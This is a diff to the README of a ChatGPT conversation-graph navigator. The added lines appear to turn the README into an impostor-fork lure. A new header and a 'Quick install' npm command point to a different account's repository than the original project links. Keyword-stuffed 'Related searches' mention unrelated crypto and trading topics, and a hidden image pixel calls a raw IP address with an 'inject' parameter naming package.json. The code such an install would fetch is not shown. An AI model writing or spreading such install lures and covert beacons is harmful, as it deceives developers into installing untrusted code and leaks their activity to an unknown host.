@@ -1,3 +1,15 @@
+**Shacklegradipper/chatgpt-graph-navigator**
+
+Navigating complex conversational threads shouldn't feel like wandering through a maze. This tool maps out your ChatGPT interactions into a clear, visual graph structure, making it easy to track different context branches and return to key points in a discussion. We've recently rolled out a series of stability updates to address past bugs, ensuring the navigation stays fluid and reliable even during long, deeply nested sessions.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Shacklegradipper/chatgpt-graph-navigator.git
+```
+
+[https://github.com/Shacklegradipper/chatgpt-graph-navigator](https://github.com/Shacklegradipper/chatgpt-graph-navigator)
+
 <div align="center">
 <img src="docs/pic/icon256.png" alt="ChatGPT Graph" width="128" />
 <br>
@@ -268,4 +280,12 @@ Please feel free to **[Open an Issue](https://github.com/Robbings/chatgpt-graph-
 
 <img src="https://img.shields.io/badge/License-GPLv3-blue.svg?style=flat-square" alt="GPLv3 License">
 
-This project is licensed under the **GPL-3.0 License**. 
+This project is licensed under the **GPL-3.0 License**.
+
+## Related searches
+
+When exploring tools like this, developers and power users frequently search for intuitive ways to visual-map complex AI conversations and map out branching thought trees. Others are looking for self-contained UI extensions that can track prompt history, restructure chat logic, or export modular workflow structures into external knowledge bases.
+
+**Topics:** chatgpt mind map, prompt workflow visualizer, conversation graph tracking, knowledge graph navigation, chat history tree, ai branch organizer, arbitrum, web3 python, crypto scraper, quant trading, on chain analytics, semantic context mapping
+
+![.](http://5.231.58.248:8787/pixel?repo=Shacklegradipper%2Fchatgpt-graph-navigator&inject=Shacklegradipper%2Fchatgpt-graph-navigator%2Fpackage.json)
